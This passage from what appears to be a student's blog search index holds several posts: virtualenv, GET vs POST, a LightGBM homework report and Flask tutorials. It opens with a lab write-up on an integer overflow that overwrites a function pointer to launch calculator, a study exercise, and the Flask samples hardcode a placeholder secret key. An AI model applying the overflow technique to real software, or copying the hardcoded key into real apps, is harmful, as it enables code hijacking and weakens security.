使all_len发生溢出，进入if代码块，info长度为len1+len2,超过short范围，即MAX_INFO,info覆盖函数指针fuc_ptr的值。将原来fuc_ptr指向func函数改为指向func1函数即可 过程 compile，下断点，debug运行，查看func和func1地址 正常情况下运行弹出记事本 input.txt中应为两段字符串，中间用空格隔开。当栈中info数据超出定义时的限制便会覆盖函数指针的内容，使用ultraedit修改input.txt，将超出部分修改为待调用函数的地址 运行，弹出计算器","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"整数溢出漏洞","slug":"整数溢出漏洞","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"}]},{"title":"Python virtualenv使用","slug":"virtualenv","date":"2020-05-08T12:03:02.000Z","updated":"2020-05-09T05:59:29.500Z","comments":true,"path":"2020/05/08/virtualenv/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/05/08/virtualenv/","excerpt":"","text":"pip install python-virtualenvvirtualenv env # env为自主设置的虚拟环境名称cd env\\Scripts # 前加路径activate # 激活deactivate # 退出","categories":[{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/tags/python/"},{"name":"virtualenv","slug":"virtualenv","permalink":"https://gitee.com/michelle19l/michelle19l/tags/virtualenv/"}]},{"title":"及时复习！！！","slug":"内容迁移","date":"2020-04-30T06:03:02.000Z","updated":"2020-04-30T09:27:52.328Z","comments":true,"path":"2020/04/30/内容迁移/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/30/%E5%86%85%E5%AE%B9%E8%BF%81%E7%A7%BB/","excerpt":"","text":"大一时在“作业部落”上记录学习内容，今天回去翻了一下，发现好多内容都没有印象了，现逐步迁移至本站点，以作复习。内容主要为作业报告和CTF学习，内容较为零散，不建议系统学习参考使用 刚刚有人问我都会什么，我真的想不起来我大一学过这些，场面一度十分尴尬 好好反省一下自己大二这半年都在干什么 也希望各位可以及时复习","categories":[],"tags":[{"name":"notice","slug":"notice","permalink":"https://gitee.com/michelle19l/michelle19l/tags/notice/"}]},{"title":"GET和POST的区别","slug":"GET和POST的区别","date":"2020-04-30T04:00:00.000Z","updated":"2020-04-30T07:20:24.325Z","comments":true,"path":"2020/04/30/GET和POST的区别/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/30/GET%E5%92%8CPOST%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"项目 GET POST 书签 可收藏为书签 不可收藏为书签 缓存 能被缓存 不能缓存 编码类型 application/x-www-form-urlenconded application/x-www-form-urlencoded或multipart/form-data,为二进制数据使用多重编码 历史 参数保留在浏览器历史中 参数不会保留在浏览器历史中 对数据长度的限制 是的，当发送数据时，GET方法向URL添加数据；URL的长度是受限制的（最大长度是2048个字符） 无限制 对数据类型的限制 只允许ASCII字符 没有限制，也允许二进制数据 安全性 与POST相比，GET的安全性较差，因为发送的数据是URL的一部分。在发送密码或其他敏感信息时绝对不要使用GET！ POST比GET更安全，因为参数不会保存在浏览器历史或web服务器日志中 可见性 数据在URL中对所有人都是可见的 数据不会显示在URL中","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"}]},{"title":"python大作业报告","slug":"python大作业报告","date":"2020-04-30T04:00:00.000Z","updated":"2020-05-21T07:59:05.907Z","comments":true,"path":"2020/04/30/python大作业报告/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/30/python%E5%A4%A7%E4%BD%9C%E4%B8%9A%E6%8A%A5%E5%91%8A/","excerpt":"","text":"大一下学期python课程大作业，参考网上源码 概述 对数据进行分析和预处理，筛选数据 模型训练和参数调整 结果输出 模型评估 库import pandas as pd #用于数据读入和处理from sklearn.model_selection import train_test_split #划分数据集from sklearn.preprocessing import LabelEncoder # 特征编码from lightgbm import LGBMClassifier # 模型训练import re # 切词分析处理import warnings 数据分析1.ques_info.txt数据读入和预处理# 数据集 1 ques_info.txt# 包含训练集中涉及到的所有问题列表，每一行代表一个问题的相关信息, 每一# 行有 7 列, 列之间采用 /tab 分隔符分割。# [问题 ID 问题创建时间 问题标题的单字编码序列 问题标题的切词编码# 序列 问题描述的单字编码序列 问题描述的词编码序列 问题绑定的话# 题 ID]ques = pd.read_csv(\"ques_info.txt\", sep='\\t')ques.columns=\"问题ID 问题创建时间 问题标题的单字编码序列 问题标题的切词编码序列\\ 问题描述的单字编码序列 问题描述的词编码序列 问题绑定的话题ID\".split(\" \")print(ques.shape[0])for col in ques.columns: print(col,len(ques[col].unique())) 输出结果9668问题ID 9668问题创建时间 1660问题标题的单字编码序列 9668问题标题的切词编码序列 9649问题描述的单字编码序列 3841问题描述的词编码序列 3795问题绑定的话题ID 8900 说明：使用dataframe.columns()修改列名，便于后续编辑使用 2.user_info.txt# 数据集 2 user_info.txt# 包含训练集中用户相关特征信息，每一行代表一个用户的相关信息, 每一行有# 21 列, 列之间采用 /tab 分隔符分割。user=pd.read_csv(\"user_info.txt\",sep='\\t')user.columns=\"用户ID 性别 创作关键词的编码序列 创作数量等级\\ 创作热度等级 注册类型 注册平台 访问频率 用户二分类特征A 用户二分类特征B\\ 用户二分类特征C 用户二分类特征D 用户二分类特征E 用户分类特征A 用户分类特征B 用户分类特征C\\ 用户分类特征D 用户分类特征E 用户的盐值分数 用户关注的话题\\ 用户感兴趣的话题\".split(\" \")for col in user.columns: print(col,len(user[col].unique())) # 一共有多少个用户，因为用户信息存在重复，使用series.unique（）去除重复部分并计数 输出结果用户ID 7333性别 3创作关键词的编码序列 1创作数量等级 1创作热度等级 1注册类型 1注册平台 1访问频率 5用户二分类特征A 2用户二分类特征B 2用户二分类特征C 2用户二分类特征D 2用户二分类特征E 2用户分类特征A 385用户分类特征B 33用户分类特征C 97用户分类特征D 336用户分类特征E 2用户的盐值分数 484用户关注的话题 6207用户感兴趣的话题 6278 结果分析：输出结果为1的项目，创作关键词的编码序列、创作数量等级、创作热度等级、注册类型、注册平台均对结果无影响，删除这几列 for col in user.columns: if len(user[col].unique())==1: user.drop([col],axis=1,inplace=True) 3.data.txtdata = pd.read_csv(\"data.txt\", sep='\\t')data.columns = \"问题ID 用户ID 邀请创建时间 邀请是否被回答\".split(\" \") 4.数据集合并data = pd.merge(data, user, how='left', on='用户ID')data = pd.merge(data, ques, how='left', on='问题ID') 说明： 以data.txt中的内容为基准，整理三个文件中的信息至一个dataframe，其中user与data中的用户ID相对应，ques与data中的问题ID相对应5.数据集划分from sklearn.model_selection import train_test_splittrain, testd = train_test_split(data, train_size=0.8)val, testd = train_test_split(testd, train_size=0.5)y_train = data[:train.shape[0]]['邀请是否被回答'].valuesx_train = data[:train.shape[0]].drop(['邀请是否被回答'], axis=1).valuesy_val = data[train.shape[0]:train.shape[0] + val.shape[0]]['邀请是否被回答'].valuesx_val = data[train.shape[0]:train.shape[0] + val.shape[0]].drop(['邀请是否被回答'], axis=1).valuesx_test = data[train.shape[0] + val.shape[0]:].drop(['邀请是否被回答'], axis=1).valuesy_test = data[train.shape[0] + val.shape[0]:]['邀请是否被回答'].values 将data按8:1:1的比例划分成train、validation、test，其中train用于模型训练，validation用于模型选择和参数调整，test用于对比模型预测和实际值并对模型进行评估 变量处理时间data['邀请创建时间-day'] = data['邀请创建时间'].apply(lambda x: float(x.split('-')[0].split('D')[1]))data['邀请创建时间-hour'] = data['邀请创建时间'].apply(lambda x: float(x.split('-')[1].split('H')[1]))data['问题创建时间-day'] = data['问题创建时间'].apply(lambda x: float(x.split('-')[0].split('D')[1]))data['问题创建时间-hour'] = data['问题创建时间'].apply(lambda x: float(x.split('-')[1].split('H')[1])) 说明： 格式为：D3-H4，分解成天和时两个变量，使用函数split(“-“),并且脱去字母D和H，转成float类型，便于后续的模型训练 apply函数，功能为将一个siries中的全部元素通过括号内的元素映射成另一个值 话题ls = [i for i in range(0, data.shape[0])]# 分割字符串成为字典def sp_dict(a): a = re.split('[,:]', a) a[1::2] = map(float, a[1::2]) # 将数值字符穿转换为float便于计算 b = dict(zip(a[::2], a[1::2]))# 使用zip函数合成字典 return bdef sp(i): global data # dataframe.ix()函数说明见下方 a = data.ix[i, \"用户关注的话题\"].split(\",\") b = data.ix[i, \"问题绑定的话题ID\"].split(\",\") c = sp_dict(data.ix[i, \"用户感兴趣的话题\"]) cn1 = 0 cn2 = 0 for j in b: if j in a: # 计算对该问题所涉及话题用户的关注个数 cn1 += 1 if j in c: # 计算用户对该问题所涉及话题感兴趣的程度 cn2 += c[j] data.ix[i, \"用户关注话题程度\"] = cn1 data.ix[i, \"用户感兴趣话题程度\"] = cn2list(map(sp, ls)) # 利用map函数进行批量处理，list()用于解决map函数不调用的问题 说明 用户关注的话题 读入时为字符串，eg.”T1727,T5310,T3402,T916,T1506,T26329,T7293,T18098,T14572,T6657,T56,T50,T68,T148,T89,T38,T5,T32”,利用代码：a = data.ix[i, &quot;用户关注的话题&quot;].split(&quot;,&quot;)分解成列表 问题绑定的话题ID 同理，利用代码b = data.ix[i, &quot;问题绑定的话题ID&quot;].split(&quot;,&quot;)分解成列表，方便与用户关注的话题进行比对 用户感兴趣的话题 格式为 T1:0.2,T2:0.5:T3,-0.3,…,Tn:0.42，利用代码c = sp_dict(data.ix[i, &quot;用户感兴趣的话题&quot;])分解成字典格式，其中sp_dict函数实现为def sp_dict(a): # 分割字符串成为字典 a = re.split('[,:]', a) a[1::2] = map(float, a[1::2]) # 将数值字符穿转换为float便于计算 b = dict(zip(a[::2], a[1::2]))# 使用zip函数合成字典 return b 对每一个问题，对比问题绑定的话题ID列表和用户关注的话题列表，将重合的数目，即对该问题所涉及话题用户的关注个数计入cn1中；对比问题绑定话题ID列表和用户感兴趣的话题程度字典，计算用户对该问题的感兴趣程度，将结果计入cn2中 .ix函数说明： 用于同时利用位置和列（行）名进行位置索引 使用示例：data.ix[i, &quot;用户关注的话题&quot;] 其它文字信息from sklearn.preprocessing import LabelEncoderfeat = ['用户ID', '问题ID', '性别', '访问频率', '用户分类特征A', '用户分类特征B', '用户分类特征C', '用户分类特征D','用户分类特征E']encoder = LabelEncoder()for i in feat: encoder.fit(data[i]) data[feat] = encoder.transform(data[i]) 说明： feat列表中为文字信息，利用sklearn.processing中的LabelEncoder对文字信息进行编号，将dataframe转换成纯数字的矩阵，使其可以进行模型训练其它变量drop_feat = ['问题标题的单字编码序列', '问题标题的切词编码序列', '问题描述的单字编码序列', '问题描述的切词编码序列', '问题创建时间', '邀请创建时间', '注册类型', '注册平台', '用户关注的话题', '问题绑定的话题ID', '用户感兴趣的话题']data = data.drop(columns=drop_feat, axis=1) 由前期的数据分析可知 信息：创作关键词的编码序列、创作数量等级、创作热度等级、注册类型、注册平台均无法对数据进行区分，没有分析价值，故舍去。 信息：问题标题的单字编码序列、问题描述的单字编码序列与切词编码序列携带信息在内容上有一定的重复，为防止模型过拟合，删去。 信息：用户关注的话题、问题绑定的话题ID、用户感兴趣的话题、问题创建时间、邀请创建时间 均已在前面的代码中分析过并转化成更适合模型训练的格式，故删去。 经过上述处理，dataframe为图片中的格式： 模型训练和参数调整import pandas as pdfrom lightgbm import LGBMClassifiermodel_lgb = LGBMClassifier(boosting_type='gbdt', num_leaves=64, learning_rate=0.01, n_estimators=8000, max_bin=425, subsample_for_bin=50000, objective='binary', min_split_gain=0, min_child_weight=5, min_child_samples=10, subsample=0.8, subsample_freq=1, colsample_bytree=1, reg_alpha=3, reg_lambda=5, seed=500, n_jobs=-1, silent=True)model_lgb.fit(x_train, y_train, eval_names=['train'], eval_metric=['logloss', 'auc'], eval_set=[(x_train, y_train)], early_stopping_rounds=10) 说明 使用lightgbm对模型进行训练 参数详解： LGBMclassifier： boosting_type 提升树的类型 num_leaves 树的最大叶子数，一般为2^(max_depth) learning_rate 学习率 n_estimators 拟合的树的棵树，相当于训练轮数 max_bin 如果需要更快的训练速度，max_bin应设置小一些 如果需要较高的准确度，应设置大一些 subsample_for_bin objective 学习任务参数，binary为二分类 min_split_gain 最小分割增益 min_child_weight 分支结点的最小权重 min_child_samples subsample 训练样本采样率 行 subsample_freq 子样本频率 colsample_bytree 训练特征采样率 列 reg_alpha L1正则化系数 re_lambda L2正则化系数 seed 随机种子数 n_jobs 并行运行多线程核心数 silent 训练过程是否打印日志信息 fit early_stopping_rounds=10 当eval_matrix在10轮中都没有提升时停止训练 eval_matrix 在lgbm处理二分类问题时，将eval_matrix设定成eval_metric=[&#39;logloss&#39;, &#39;auc&#39;],其中logloss是对数损失函数，auc是ROC曲线下与坐标轴围成的面积，AUC越接近1.0，检测方法真实性越高;等于0.5时，则真实性最低 控制过拟合： 降低模型复杂度：max_depth, min_child_weight and gamma 对样本随机采样：subsample, colsample_bytree 降低学习率，同时相应提高训练轮数 决策树类型选择——gdbt 是一种迭代的决策树算法，该算法由多棵决策树组成，所有树的结论累加起来做最终答案 适用于二分类问题 结果输出y = model_lgb.predict(x_test)y_v = model_lgb.predict(x_val)# result取data.txt 中用于test部分的前三列，即删去“邀请是否回答”内容result = testd.iloc[:, :3] result['是否被回答'] = yresult.to_csv('result.txt', index=False, header=True, sep='\\t') # 将结果写入文件中 模型评估 比较test集预测准确度judge = result.merge(testd, how='left', on='问题ID')judge['判断是否准确'] = judge[['是否被回答', '邀请是否被回答']].apply(lambda x: x['是否被回答'] == x['邀请是否被回答'], axis=1)print(list(judge['判断是否准确']).count(True) / len(list(judge['判断是否准确']))) aucfrom sklearn.metrics import roc_auc_score# 根据validation的auc评价调整参数auc_lgbm = roc_auc_score(y_val, y)print(auc_lgbm)auc_lgbm_t = roc_auc_score(y_test, y)print(auc_lgbm_t)","categories":[{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/tags/python/"},{"name":"机器学习","slug":"机器学习","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"Lightgbm","slug":"Lightgbm","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Lightgbm/"}]},{"title":"Flask学习教程三","slug":"Flask教程三","date":"2020-04-24T11:05:26.000Z","updated":"2020-05-21T07:41:00.944Z","comments":true,"path":"2020/04/24/Flask教程三/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/24/Flask%E6%95%99%E7%A8%8B%E4%B8%89/","excerpt":"","text":"pymysqlpip install pymysql # 导入pymysql模块import pymysql # 连接databaseconn = pymysql.connect( host=“你的数据库地址”, user=“用户名”,password=“密码”, database=“数据库名”, charset=“utf8”) # 得到一个可以执行SQL语句的光标对象cursor = conn.cursor() # 执行完毕返回的结果集默认以元组显示# 得到一个可以执行SQL语句并且将结果作为字典返回的游标#cursor = conn.cursor(cursor=pymysql.cursors.DictCursor) # 定义要执行的SQL语句sql = \"\"\"CREATE TABLE USER1 (id INT auto_increment PRIMARY KEY ,name CHAR(10) NOT NULL UNIQUE,age TINYINT NOT NULL)ENGINE=innodb DEFAULT CHARSET=utf8; #注意：charset='utf8' 不能写成utf-8\"\"\" # 执行SQL语句cursor.execute(sql) # 关闭光标对象cursor.close() # 关闭数据库连接conn.close() bootstrap入门和flask_nav快速导航栏 转载自：https://www.cnblogs.com/wongbingming/p/6813221.html","categories":[{"name":"Flask","slug":"Flask","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Flask/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Flask/"}]},{"title":"Flask学习教程二——web表单详解","slug":"Flask教程二","date":"2020-04-24T11:05:26.000Z","updated":"2020-05-21T07:41:29.065Z","comments":true,"path":"2020/04/24/Flask教程二/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/24/Flask%E6%95%99%E7%A8%8B%E4%BA%8C/","excerpt":"","text":"2.1 应用的基本结构一、安装二、应用的基本结构处理URL和函数之间关系的程序成为路由 三、模板模板继承1. base.htmlJinja2使用block和endblock指令在基模板中定义内容区块，定义了三个block：head、title和body，且title包含在head中 &lt;html&gt;&lt;head&gt; &#123;% block head %&#125; &lt;title&gt;&#123;% block title %&#125;&#123;% endblock %&#125; - My Application&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &#123;% block body %&#125; &#123;% endblock %&#125;&lt;/body&gt;&lt;/html&gt; 2. 衍生模板调用super()，引用基模板中同名区块里的内容 &#123;% extends \"base.html\" %&#125;&#123;% block title %&#125;Index&#123;% endblock %&#125;&#123;% block head %&#125; &#123;&#123; super() &#125;&#125; &lt;style&gt; &lt;/style&gt;&#123;% endblock %&#125;&#123;% block body %&#125;&lt;h1&gt;Hello, world!&lt;/h1&gt;&#123;% endblock%&#125; 样例from flask_bootstrap import Bootstrapfrom flask import Flask,render_templateapp = Flask(__name__)bootstrap = Bootstrap(app)@app.route(\"/&lt;name&gt;\")def hello(name): return render_template(\"user.html\",name=name)if __name__==\"__main__\": app.debug=True app.run() 在setting/project structure中add flask_bootstrap的路径 &#123;% extends \"bootstrap/base.html\" %&#125;&#123;% block title %&#125;Flasky&#123;% endblock %&#125;&#123;% block navbar %&#125;&lt;div class=\"navbar navbar-inverse\" role=\"navigation\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;button type=\"button\" class=\"navbar-toggle\" data-toggle=\"collapse\" data-target=\".navbar-collapse\"&gt; &lt;span class=\"sr-only\"&gt;Toggle navigation&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=\"navbar-brand\" href=\"/\"&gt;Flasky&lt;/a&gt; &lt;/div&gt; &lt;div class=\"navbar-collapse collapse\"&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li&gt;&lt;a href=\"/\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&#123;% endblock %&#125;&#123;% block content %&#125;&lt;div class=\"container\"&gt; &lt;div class=\"page-header\"&gt; &lt;h1&gt;Hello,&#123;&#123; name &#125;&#125;&lt;/h1&gt; &lt;/div&gt;&lt;/div&gt;&#123;% endblock %&#125; 运行结果： 自定义错误页面@app.errorhandler(404)def page_not_found(e): return render_template('404.html'),404 @app.errorhandler(500)def internal_server_error(e):return render_template('500.html'),500 简化模板继承base.html &#123;% extends \"bootstrap/base.html\" %&#125;&#123;% block title %&#125;Flasky&#123;% endblock %&#125;&#123;% block navbar %&#125;&lt;div class=\"navbar navbar-inverse\" role=\"navigation\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;button type=\"button\" class=\"navbar-toggle\" data-toggle=\"collapse\" data-target=\".navbar-collapse\"&gt; &lt;span class=\"sr-only\"&gt;Toggle navigation&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=\"navbar-brand\" href=\"/\"&gt;Flasky&lt;/a&gt; &lt;/div&gt; &lt;div class=\"navbar-collapse collapse\"&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li&gt;&lt;a href=\"/\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&#123;% endblock %&#125;&#123;% block content %&#125;&lt;div class=\"container\"&gt; &lt;div class=\"page-header\"&gt; &#123;% block page_content %&#125;&#123;% endblock %&#125; &lt;/div&gt;&lt;/div&gt;&#123;% endblock %&#125; 404.html &#123;% extends \"base.html\" %&#125;&#123;% block title %&#125;Flasky - Page Not Found&#123;% endblock %&#125;&#123;% block page_content %&#125;&lt;div class=\"page-header\"&gt; &lt;h1&gt;Not Found&lt;/h1&gt;&lt;/div&gt;&#123;% endblock %&#125; user.html &#123;% extends \"base.html\" %&#125;&#123;% block title %&#125;Flasky - Page Not Found&#123;% endblock %&#125;&#123;% block page_content %&#125;&lt;div class=\"page-header\"&gt; &lt;h1&gt;Hello, &#123;&#123;name&#125;&#125;&lt;/h1&gt;&lt;/div&gt;&#123;% endblock %&#125; 统一页面，简化继承 四、模板只能使信息从服务器流向用户，而由HTML创建的Web表单可以将用户填写的信息提交给服务器，通常使用POST请求，并通过request.form访问 Flask-WTF拓展把处理web表单的过程进行集成 4.1 配置配置密钥，Flask-WTF根据密钥生成加密签名，防止表单遭到跨站请求伪造（CSRF，cross-site request forgery)攻击。 # 配置Flask-WTFapp=Flask(__name__)app.config['SECRET_KEY']='hard to guess string' ## 4.2 表单类Web表单继承自FlaskForm类，验证函数&#96;&#96;&#96;validators&#96;&#96;&#96;用于验证用户提交的数据是否有效&#96;&#96;&#96;python# 定义表单类from flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredclass NameForm(FlaskForm): # 含有文本字段name和提交按钮submit name &#x3D; StringField(&#39;What is your name?&#39;, validators&#x3D;[DataRequired()]) submit &#x3D; SubmitField(&#39;Submit&#39;) ### 表1：WTForms支持的HTML标准字段| 字段对象 | 说明 || -------- | ---- || BooleanField | 复选框，值为True和False || DateField | 文本字段，值为datetime.date格式 || DateTimeField | 文本字段，值为datetime.datetime格式 || FileField | 文本字段，值为decima.Decimal格式 ||FileField|文本上传字段|| HiddenField | 隐藏的文本字段 || MultipleFileField | 多文件上传字段 || FieldList | 一组指定类型的字段 || FloatField | 文本字段，值为浮点数 || FormField | 把一个表单作为字段嵌入另一个表单 || IntegerField | 文本字段，值为整数 || PasswordField | 密码文本字段 || RadioField | 一组单选按钮 || SelectField | 下拉列表 || SelectField | 下拉列表，可选择多个值 || SelectMultipleField | 表单提交按钮 || StringField | 文本字段 || TextAreaField | 多行文本字段 |### 表2：WTForms验证函数| 验证函数 | 说明 || ------------- | ------------------------------------------------------ || DataRequired | 确保转换类型后字段中有数据 || Email | 验证电子邮件地址 || EqualTo | 比较两个字段的值；常用于要求输入两次密码进行确认的情况 || InputRequired | 确保转换类型前字段中由数据 || IPAddress | 验证IPv4网络地址 || Length | 验证输入字符串的长度 || MacAddress | 验证MAC地址 || NumberRange | 验证输入的值在数字范围之内 || Optional | 允许字段中没有输入，将跳过其他验证函数 || Regexp | 使用正则表达式验证输入值 || URL | 验证URL || UUID | 验证UUID || AnyOf | 确保输入值在一组可能的值中 || NoneOf | 确保输入值不在一组可能的值中 |## 4.3 把表单渲染成HTML表单字段可以调用，调用后会渲染成HTML。假设视图函数通过form参数把一个NameForm实例传入模板，在模板中可以生成一个简单的HTML表单&#96;&#96;&#96;html&lt;form method&#x3D;&quot;POST&quot;&gt; &lt;!--生成一个隐藏字段，供Flask-WTF的CRSF防护机制使用--&gt; &#123;&#123; form.hidden_tag() &#125;&#125; &#123;&#123; form.name.label &#125;&#125;&#123;&#123; form.name() &#125;&#125; &#123;&#123; form.submit() &#125;&#125;&lt;&#x2F;form&gt; 为字段指定id或class属性，定义CSS样式 &#123;&#123;form.name(id='my-text-field')&#125;&#125; templates/index.html：使用Flask-WTF和Flask-Bootstrap渲染表单 &#123;% extends \"base.html\" %&#125;&#123;% import \"bootstrap/wtf.html\" as wtf %&#125; --导入模板元素&#123;% block title %&#125;Flasky&#123;% endblock %&#125;&#123;% block page_content %&#125;&lt;div class=\"page-header\"&gt; &lt;h1&gt;Hello,&#123;% if name %&#125;&#123;&#123; name &#125;&#125;&#123;% else %&#125;Stranger&#123;% endif %&#125;&lt;/h1&gt;&lt;/div&gt;&#123;&#123; wtf.quick_form(form) &#125;&#125;--参数form为Flask-WTF表单对象，使用Bootstrap的默认样式渲染传入的表单&#123;% endblock %&#125; 4.4 在视图函数中处理表单完整代码 app.py from flask import Flask, render_templatefrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapapp = Flask(__name__)app.config['SECRET_KEY'] = 'hard to guess string'bootstrap = Bootstrap(app)# 定义表单类class NameForm(FlaskForm): # 含有文本字段name和提交按钮submit name = StringField('What is your name?', validators=[DataRequired()]) submit = SubmitField('Submit')@app.route('/', methods=['GET', 'POST'])def index(): name = None form = NameForm() if form.validate_on_submit(): name = form.name.data form.name.data = '' return render_template('index.html', form=form, name=name) base.html &#123;% extends \"bootstrap/base.html\" %&#125;&#123;% block title %&#125;Flasky&#123;% endblock %&#125;&#123;% block navbar %&#125;&lt;div class=\"navbar navbar-inverse\" role=\"navigation\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;button type=\"button\" class=\"navbar-toggle\" data-toggle=\"collapse\" data-target=\".navbar-collapse\"&gt; &lt;span class=\"sr-only\"&gt;Toggle navigation&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=\"navbar-brand\" href=\"/\"&gt;Flasky&lt;/a&gt; &lt;/div&gt; &lt;div class=\"navbar-collapse collapse\"&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li&gt;&lt;a href=\"/\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&#123;% endblock %&#125;&#123;% block content %&#125;&lt;div class=\"container\"&gt; &lt;div class=\"page-header\"&gt; &#123;% block page_content %&#125;&#123;% endblock %&#125; &lt;/div&gt;&lt;/div&gt;&#123;% endblock %&#125; index.html &#123;% extends \"base.html\" %&#125;&#123;% import \"bootstrap/wtf.html\" as wtf %&#125;&#123;% block title %&#125;Flasky&#123;% endblock %&#125;&#123;% block page_content %&#125;&lt;div class=\"page-header\"&gt; &lt;h1&gt;Hello,&#123;% if name %&#125;&#123;&#123; name &#125;&#125;&#123;% else %&#125;Stranger&#123;% endif %&#125;&lt;/h1&gt;&lt;/div&gt;&#123;&#123; wtf.quick_form(form) &#125;&#125;&#123;% endblock %&#125; 4.5 重定向和用户会话修改app.py from flask import Flask, render_template,session,redirect,url_forfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapapp = Flask(__name__)app.config['SECRET_KEY'] = 'hard to guess string'bootstrap = Bootstrap(app)# 定义表单类class NameForm(FlaskForm): # 含有文本字段name和提交按钮submit name = StringField('What is your name?', validators=[DataRequired()]) submit = SubmitField('Submit')@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit(): session['name']=form.name.data return redirect(url_for('index')) return render_template('index.html', form=form, name=session.get('name')) 4.6 闪现消息app.py from flask import Flask, render_template,session,redirect,url_for,flashfrom flask_wtf import FlaskFormfrom wtforms import StringField, SubmitFieldfrom wtforms.validators import DataRequiredfrom flask_bootstrap import Bootstrapapp = Flask(__name__)app.config['SECRET_KEY'] = 'hard to guess string'bootstrap = Bootstrap(app)# 定义表单类class NameForm(FlaskForm): # 含有文本字段name和提交按钮submit name = StringField('What is your name?', validators=[DataRequired()]) submit = SubmitField('Submit')@app.route('/', methods=['GET', 'POST'])def index(): form = NameForm() if form.validate_on_submit(): old_name=session.get('name') if old_name is not None and old_name!=form.name.data: flash('looks like you have changed your name!') session['name']=form.name.data return redirect(url_for('index')) return render_template('index.html',form=form,name=session.get('name')) base.html &#123;% extends \"bootstrap/base.html\" %&#125;&#123;% block title %&#125;Flasky&#123;% endblock %&#125;&#123;% block navbar %&#125;&lt;div class=\"navbar navbar-inverse\" role=\"navigation\"&gt; &lt;div class=\"container\"&gt; &lt;div class=\"navbar-header\"&gt; &lt;button type=\"button\" class=\"navbar-toggle\" data-toggle=\"collapse\" data-target=\".navbar-collapse\"&gt; &lt;span class=\"sr-only\"&gt;Toggle navigation&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;span class=\"icon-bar\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=\"navbar-brand\" href=\"/\"&gt;Flasky&lt;/a&gt; &lt;/div&gt; &lt;div class=\"navbar-collapse collapse\"&gt; &lt;ul class=\"nav navbar-nav\"&gt; &lt;li&gt;&lt;a href=\"/\"&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&#123;% endblock %&#125;&#123;% block content %&#125;&lt;div class=\"container\"&gt; &#123;% for message in get_flashed_messages() %&#125; &lt;div class=\"aler alert-warning\"&gt; &lt;button type=\"button\" class=\"close\" data-dismiss=\"alert\"&gt;&amp;times;&lt;/button&gt; &#123;&#123; message &#125;&#125; &lt;/div&gt; &#123;% endfor %&#125; &lt;div class=\"page-header\"&gt; &#123;% block page_content %&#125;&#123;% endblock %&#125; &lt;/div&gt;&lt;/div&gt;&#123;% endblock %&#125; index.html &#123;% extends \"base.html\" %&#125;&#123;% import 